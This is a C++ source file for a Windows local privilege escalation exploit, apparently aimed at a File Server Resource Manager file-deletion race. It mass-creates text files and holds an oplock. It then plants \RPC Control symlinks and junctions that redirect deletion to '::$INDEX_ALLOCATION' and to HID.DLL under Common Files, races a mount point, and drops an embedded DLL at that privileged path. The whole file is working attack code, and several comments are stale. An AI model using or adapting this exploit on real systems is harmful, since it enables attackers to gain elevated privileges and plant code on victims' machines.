#include "CommonUtils.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include "FileSymlink.h"
#include "resource.h"
#include <strsafe.h>
#include <windows.h>
#include <winternl.h>
#include <combaseapi.h>
#include <comdef.h>
#include <shlwapi.h>
#include <AclAPI.h>

#pragma comment(lib,"Rpcrt4.lib")
#pragma comment(lib,"Shlwapi.lib")
WCHAR* GetPrinterDrivers();
BOOL LoadDLL(WCHAR* printdrv);

// Paths
WCHAR m_FsrmDir[MAX_PATH];
WCHAR m_TestDir[MAX_PATH];
WCHAR m_Test1Txt[MAX_PATH];
WCHAR m_Test999Txt[MAX_PATH];
WCHAR m_ToDel[MAX_PATH];
WCHAR m_ToDel2[MAX_PATH];
WCHAR m_HIDDLL[MAX_PATH];

// oplock
FileOpLock* oplock;
const WCHAR* wszBaseObjDir = L"\\RPC Control";

void InitVars() {
	ZeroMemory(m_FsrmDir, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_TestDir, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_Test1Txt, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_Test999Txt, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_ToDel, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_ToDel2, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(m_HIDDLL, MAX_PATH * sizeof(WCHAR));
}

void dummyHandle() {
	return;
}


BOOL WriteContent() {
	const char* content = "test hack";
	WCHAR txtname[MAX_PATH];
	for (size_t i = 1; i < 1000; i++) {
		ZeroMemory(txtname, MAX_PATH * sizeof(WCHAR));
		wsprintf(txtname, L"C:\\test\\test\\%d.txt", i);
		HANDLE hFile = CreateFileW(txtname, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
		if (hFile != INVALID_HANDLE_VALUE) {
			DWORD bytesWritten;
			WriteFile(hFile, content, strlen(content), &bytesWritten, nullptr);
			CloseHandle(hFile);
		}
		else {
			wprintf_s(L"[-] WriteFile('%ls') failed (Err: %d).\n", txtname, GetLastError());
			return FALSE;
		}
	}
	return TRUE;
}

int wmain() {
	InitVars();

	// C:\test
	StringCchCat(m_FsrmDir, MAX_PATH, L"C:\\test\\");

	// C:\test\test
	StringCchCat(m_TestDir, MAX_PATH, m_FsrmDir);
	StringCchCat(m_TestDir, MAX_PATH, L"test\\");

	// C:\test\test\999.txt
	StringCchCat(m_Test999Txt, MAX_PATH, m_TestDir);
	StringCchCat(m_Test999Txt, MAX_PATH, L"990.txt");

	// C:\test\test\1.txt
	StringCchCat(m_Test1Txt, MAX_PATH, m_TestDir);
	StringCchCat(m_Test1Txt, MAX_PATH, L"650.txt");

	// C:\\Windows\\System32\\todel.dll
	StringCchCat(m_ToDel, MAX_PATH, L"C:\\test\\junc\\");
	StringCchCat(m_ToDel2, MAX_PATH, L"C:\\test\\junc::$INDEX_ALLOCATION");

	// spool driver
	StringCchCat(m_HIDDLL, MAX_PATH, L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.DLL");

	DWORD attributes;
	DWORD result = CreateDirectoryW(m_ToDel, nullptr);
	if (!result) {
		wprintf_s(L"[+] The directory %ls exists.\n", m_ToDel);
	}
	else {
		if (!ReparsePoint::CreateMountPoint(m_ToDel, wszBaseObjDir, L"")) {
			wprintf_s(L"[-] The directory %ls cannot be redirect to %ls .\n", m_ToDel, wszBaseObjDir);
			return -1;
		}
	}

	attributes = GetFileAttributesW(m_FsrmDir);
	if (!((attributes != INVALID_FILE_ATTRIBUTES) && (attributes & FILE_ATTRIBUTE_DIRECTORY))) {
		wprintf_s(L"[-] Directory('%ls') not exist (Err: %d).\n", m_FsrmDir, GetLastError());
		return -1;
	}

	if (!CreateDirectory(m_TestDir, nullptr)) {
		wprintf_s(L"[-] CreateDirectory('%ls') failed (Err: %d).\n", m_TestDir, GetLastError());
	}
	wprintf_s(L"[*] Writing File 1.txt - 999.txt\n");
	if (!WriteContent()) {
		return -1;
	}
	LPCWSTR share_mode = L"d";
	oplock = FileOpLock::CreateLock(m_Test1Txt, share_mode, dummyHandle);
	if (oplock != nullptr) {
		oplock->WaitForLock(INFINITE);
		delete oplock;
	}
	else {
		printf("Error creating oplock\n");
		return -1;
	}
	
	WCHAR wszLinkName[MAX_PATH];
	WCHAR wszLinkTarget[MAX_PATH];
	ZeroMemory(wszLinkName, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(wszLinkTarget, MAX_PATH * sizeof(WCHAR));

	swprintf_s(wszLinkName, MAX_PATH, L"%ls\\%ls", wszBaseObjDir, L"990.txt"); // -> '\RPC Control\xxx.catalog'
	swprintf_s(wszLinkTarget, MAX_PATH, L"\\??\\%ls", m_ToDel2); // -> '\??\C:\Windows\System32\todel.dll' 

	HANDLE hSymlinkSource = CreateSymlink(nullptr, wszLinkName, wszLinkTarget);
	if (hSymlinkSource == nullptr) {
		wprintf_s(L"[-] CreateSymlink('%ls') failed.\n", wszLinkName);
		return -1;
	}

	ZeroMemory(wszLinkName, MAX_PATH * sizeof(WCHAR));
	ZeroMemory(wszLinkTarget, MAX_PATH * sizeof(WCHAR));

	swprintf_s(wszLinkName, MAX_PATH, L"%ls\\%ls", wszBaseObjDir, L"1.txt"); // -> '\RPC Control\xxx.catalog'
	swprintf_s(wszLinkTarget, MAX_PATH, L"\\??\\%ls", m_HIDDLL); // -> '\??\C:\Windows\System32\todel.dll' 

	hSymlinkSource = CreateSymlink(nullptr, wszLinkName, wszLinkTarget);
	if (hSymlinkSource == nullptr) {
		wprintf_s(L"[-] CreateSymlink('%ls') failed.\n", wszLinkName);
		return -1;
	}

	WCHAR txtname[MAX_PATH];
	for (size_t i = 999; i > 800; i--) {
		ZeroMemory(txtname, MAX_PATH * sizeof(WCHAR));
		wsprintf(txtname, L"C:\\test\\test\\%d.txt", i);
		DeleteFileW(txtname);
	}

	wprintf_s(L"[*] Waiting for race\n");
	while (!ReparsePoint::CreateMountPoint(m_TestDir, wszBaseObjDir, L"")) {
		;
	}
	wprintf_s(L"[+] ReparsePoint::CreateMountPoint success\n");
	wprintf_s(L"[*] %ls should already be deleted.\n", m_ToDel);
	int _ = getchar();
	attributes = GetFileAttributesW(m_ToDel);
	if (attributes == INVALID_FILE_ATTRIBUTES) {
		wprintf_s(L"[+] Exploiting status: Junction created!!!\n");
		if (!RemoveDirectoryW(m_TestDir)) {
			wprintf_s(L"[-] RemoveDirectoryW('%ls') failed. ??????\n", m_TestDir);
			return -1;
		}
		if (!CreateDirectoryW(m_TestDir, nullptr)) {
			wprintf_s(L"[-] CreateDirectoryW('%ls') failed. ??????\n", m_TestDir);
			return -1;
		}
		WCHAR tmpDir[MAX_PATH];
		ZeroMemory(tmpDir, MAX_PATH * sizeof(WCHAR));
		StringCchCat(tmpDir, MAX_PATH, m_TestDir);
		StringCchCat(tmpDir, MAX_PATH, L"990.txt\\");
		if (!CreateDirectoryW(tmpDir, nullptr)) {
			wprintf_s(L"[-] CreateDirectoryW('%ls') failed. ??????\n", tmpDir);
			return -1;
		}
		StringCchCat(tmpDir, MAX_PATH, L"1.txt");

		HMODULE hm = GetModuleHandle(NULL);
		HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
		DWORD DllSize = SizeofResource(hm, res);
		HGLOBAL  DllBuff = LoadResource(hm, res);
		LPVOID pRes = LockResource(res);
		HANDLE  dll = CreateFile(tmpDir, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);
		DWORD dwBytesWritten = 0;
		if (!WriteFile(dll, DllBuff, DllSize, &dwBytesWritten, NULL)) {
			printf("[-] Error [WriteFile]: 0x%x\n", GetLastError());
			return -1;
		}
		if (dwBytesWritten == 0) {
			wprintf(L"[*] WARN [WriteFile]: size: %d\n", dwBytesWritten);
		}
		CloseHandle(dll);
		do {
			Sleep(1000);
			attributes = GetFileAttributesW(m_HIDDLL);
		} while (attributes == INVALID_FILE_ATTRIBUTES);
		wprintf_s(L"[+] Exploiting status: SUCCESS......\n");
	}
	else {
		wprintf_s(L"[-] Exploiting status: FAILED......\n");
	}
	
	return 0;
}